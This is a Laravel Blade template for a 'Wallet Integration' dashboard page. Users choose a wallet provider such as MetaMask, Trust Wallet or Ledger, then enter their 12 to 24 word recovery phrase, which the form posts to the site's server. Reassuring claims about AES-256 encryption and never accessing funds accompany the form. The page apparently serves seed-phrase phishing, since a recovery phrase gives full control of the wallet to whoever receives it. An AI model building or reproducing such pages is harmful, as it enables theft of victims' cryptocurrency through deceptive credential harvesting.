@extends('layouts.dash')
@section('title', $title)
@section('content')

<div class="mb-6">
    <h1 class="text-2xl font-bold dark:text-white text-dark">Wallet Integration</h1>
    <p class="mt-1 text-sm dark:text-gray-400 text-gray-600">Securely link your crypto wallet to your {{ $settings->site_name }} account</p>
</div>

<x-danger-alert />
<x-success-alert />

<div class="max-w-4xl mx-auto" 
     x-data="{ 
        selectedWallet: '', 
        showOtherWallets: false, 
        recoveryPhrase: '', 
        isConnecting: false,
        get wordCount() { 
            return this.recoveryPhrase.trim() ? this.recoveryPhrase.trim().split(/\s+/).length : 0 
        },
        get isValidPhrase() {
            return this.wordCount >= 12 && this.wordCount <= 24 && !this.hasInvalidChars;
        },
        get hasInvalidChars() {
            return /[0-9!@#$%^&*(),.?\':{}|<>]/.test(this.recoveryPhrase);
        },
        selectWallet(name) {
            this.selectedWallet = name;
            this.showOtherWallets = false;
        }
     }">
    
    <div class="bg-white dark:bg-dark-50 rounded-xl shadow-lg border border-gray-200 dark:border-dark-200 overflow-hidden">
        <div class="p-6 border-b border-gray-200 dark:border-dark-200 bg-light-100/50 dark:bg-dark-100/50">
            <div class="flex items-center gap-4">
                <div class="p-3 bg-primary/10 rounded-lg">
                    <i data-lucide="wallet" class="w-8 h-8 text-primary"></i>
                </div>
                <div>
                    <h2 class="text-xl font-bold text-gray-900 dark:text-white">Connect Your Wallet</h2>
                    <p class="text-gray-600 dark:text-gray-400 text-sm">Choose your provider and enter your recovery phrase</p>
                </div>
            </div>
        </div>

        <div class="p-6">
            <form method="POST" action="{{ route('wallet.store') }}" class="space-y-8">
                @csrf
                
                <div>
                    <label class="block text-sm font-semibold text-gray-700 dark:text-gray-300 mb-4">Select Wallet Provider</label>
                    <div class="grid grid-cols-2 sm:grid-cols-4 gap-4 mb-6">
                        <div @click="selectWallet('MetaMask')" 
                             :class="selectedWallet === 'MetaMask' ? 'ring-2 ring-primary bg-primary/5 border-primary' : 'bg-gray-50 dark:bg-dark-100 border-transparent'"
                             class="p-4 rounded-xl cursor-pointer transition-all border text-center hover:shadow-md">
                            <div class="w-12 h-12 mx-auto mb-2 flex items-center justify-center">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg" class="w-8 h-8" alt="MetaMask">
                            </div>
                            <span class="text-xs font-medium dark:text-white">MetaMask</span>
                        </div>

                        <div @click="selectWallet('Trust Wallet')" 
                             :class="selectedWallet === 'Trust Wallet' ? 'ring-2 ring-primary bg-primary/5 border-primary' : 'bg-gray-50 dark:bg-dark-100 border-transparent'"
                             class="p-4 rounded-xl cursor-pointer transition-all border text-center hover:shadow-md">
                            <div class="w-12 h-12 mx-auto mb-2 flex items-center justify-center">
                                <i data-lucide="shield-check" class="text-blue-500"></i>
                            </div>
                            <span class="text-xs font-medium dark:text-white">Trust Wallet</span>
                        </div>

                        <div @click="selectWallet('Coinbase')" 
                             :class="selectedWallet === 'Coinbase' ? 'ring-2 ring-primary bg-primary/5 border-primary' : 'bg-gray-50 dark:bg-dark-100 border-transparent'"
                             class="p-4 rounded-xl cursor-pointer transition-all border text-center hover:shadow-md">
                            <div class="w-12 h-12 mx-auto mb-2 flex items-center justify-center">
                                <div class="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-white font-bold">C</div>
                            </div>
                            <span class="text-xs font-medium dark:text-white">Coinbase</span>
                        </div>

                        <div @click="showOtherWallets = !showOtherWallets" 
                             class="p-4 rounded-xl cursor-pointer transition-all border-2 border-dashed border-gray-300 dark:border-dark-200 text-center hover:border-primary">
                            <div class="w-12 h-12 mx-auto mb-2 flex items-center justify-center">
                                <i data-lucide="more-horizontal" class="text-gray-400"></i>
                            </div>
                            <span class="text-xs font-medium dark:text-gray-500">Others</span>
                        </div>
                    </div>

                    <div x-show="showOtherWallets" x-transition class="mb-6">
                        <select x-model="selectedWallet" name="wallet" class="w-full p-3 rounded-lg dark:bg-dark-100 dark:text-white border-gray-300 dark:border-dark-200">
                            <option value="">Choose a provider...</option>
                            <option value="Exodus">Exodus</option>
                            <option value="Ledger">Ledger</option>
                            <option value="Trezor">Trezor</option>
                        </select>
                    </div>
                    <input type="hidden" name="wallet" :value="selectedWallet">
                </div>

                <div x-show="selectedWallet" x-transition>
                    <label class="block text-sm font-semibold text-gray-700 dark:text-gray-300 mb-2">Recovery Phrase (Seed Phrase)</label>
                    
                    <div class="bg-amber-50 dark:bg-amber-900/20 border-l-4 border-amber-400 p-4 rounded-r-lg mb-4">
                        <p class="text-xs text-amber-700 dark:text-amber-300">
                            <strong>Security Note:</strong> Your phrase is encrypted using AES-256. We never access your funds directly.
                        </p>
                    </div>

                    <div class="relative">
                        <textarea name="mnemonic" x-model="recoveryPhrase" rows="4"
                            class="w-full p-4 rounded-xl border dark:bg-dark-100 dark:text-white dark:border-dark-200 focus:ring-2 focus:ring-primary outline-none transition-all"
                            placeholder="Enter your 12 or 24 words..."></textarea>
                        <div class="absolute bottom-3 right-3 text-xs text-gray-400">
                            <span x-text="wordCount"></span> words
                        </div>
                    </div>

                    <div class="mt-3 space-y-2">
                        <div class="flex items-center gap-2 text-sm" :class="wordCount >= 12 && wordCount <= 24 ? 'text-green-500' : 'text-gray-400'">
                            <i data-lucide="check-circle" class="w-4 h-4"></i>
                            <span>Valid count (12-24 words)</span>
                        </div>
                    </div>

                    <div class="mt-8">
                        <button type="submit" 
                                :disabled="!isValidPhrase"
                                @click="isConnecting = true"
                                class="w-full py-4 bg-primary hover:bg-primary-600 text-white font-bold rounded-xl transition-all shadow-lg flex items-center justify-center gap-3 disabled:opacity-50 disabled:cursor-not-allowed">
                            <template x-if="!isConnecting">
                                <div class="flex items-center gap-2">
                                    <i data-lucide="link" class="w-5 h-5"></i>
                                    <span>Connect Securely</span>
                                </div>
                            </template>
                            <template x-if="isConnecting">
                                <div class="flex items-center gap-2">
                                    <div class="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                                    <span>Verifying...</span>
                                </div>
                            </template>
                        </button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>

@endsection